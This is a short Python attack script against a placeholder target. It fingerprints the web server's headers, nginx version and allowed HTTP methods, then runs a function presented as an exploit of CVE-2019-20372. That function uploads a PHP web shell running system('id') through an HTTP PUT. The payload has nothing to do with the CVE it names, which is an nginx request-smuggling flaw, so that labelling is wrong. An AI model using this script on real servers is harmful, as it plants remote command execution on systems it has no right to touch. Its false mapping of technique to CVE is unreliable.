import requests
import re

# Configuración
TARGET_URL = "https://example.com" 

def get_http_headers():
    try:
        response = requests.get(TARGET_URL, timeout=5)
        print("[+] HTTP Headers:")
        for header, value in response.headers.items():
            print(f"    {header}: {value}")
    except requests.RequestException as e:
        print(f"[-] Failed to retrieve headers: {e}")

def check_nginx_version():
    try:
        response = requests.get(TARGET_URL, timeout=5)
        server_header = response.headers.get("Server", "")
        
        if "nginx" in server_header:
            version = re.search(r'nginx/([\d\.]+)', server_header)
            if version:
                print(f"[+] Nginx version detected: {version.group(1)}")
                if version.group(1) == "1.14.2":
                    print("[!] Target is running vulnerable Nginx 1.14.2")
                    return True
            else:
                print("[-] Unable to extract version from Server header.")
        else:
            print("[-] Nginx not detected.")
    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")
    return False

def check_allowed_methods():
    try:
        response = requests.options(TARGET_URL, timeout=5)
        allowed_methods = response.headers.get("Allow", "Not specified")
        print(f"[+] Allowed HTTP Methods: {allowed_methods}")
    except requests.RequestException as e:
        print(f"[-] Failed to check allowed methods: {e}")

def exploit_cve_2019_20372():
    print("[+] Attempting to exploit CVE-2019-20372")
    payload = "<?php system('id'); ?>"
    headers = {
        "Content-Type": "application/octet-stream"
    }
    try:
        response = requests.put(f"{TARGET_URL}/exploit.php", data=payload, headers=headers, timeout=5)
        if response.status_code in [200, 201, 204]:
            print("[!] Exploit successful! Check the uploaded file.")
        else:
            print("[-] Exploit failed.")
    except requests.RequestException as e:
        print(f"[-] Exploit request failed: {e}")

if __name__ == "__main__":
    get_http_headers()
    check_nginx_version()
    check_allowed_methods()
    exploit_cve_2019_20372()
